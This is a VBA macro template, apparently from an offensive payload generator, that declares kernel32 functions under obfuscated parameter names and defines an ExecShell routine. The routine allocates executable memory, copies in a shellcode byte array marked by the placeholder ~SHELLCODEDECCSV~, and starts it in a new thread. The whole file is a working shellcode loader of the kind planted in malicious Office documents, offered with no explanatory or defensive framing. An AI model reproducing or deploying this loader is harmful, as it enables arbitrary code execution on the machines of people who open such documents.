#If Vba7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr
    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
 #Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long
    Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds as Long)
 #EndIf

Sub ExecShell
    Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long
#If Vba7 Then
    Dim  Xlbufvetp As LongPtr
#Else
    Dim  Xlbufvetp As Long
#EndIf
    Hyeyhafxp = Array(~SHELLCODEDECCSV~)
    Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)
    For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)
        Wyzayxya = Hyeyhafxp(Zolde)
        Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)
    Next Zolde
    Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)
    Sleep ~SLEEP~
End Sub
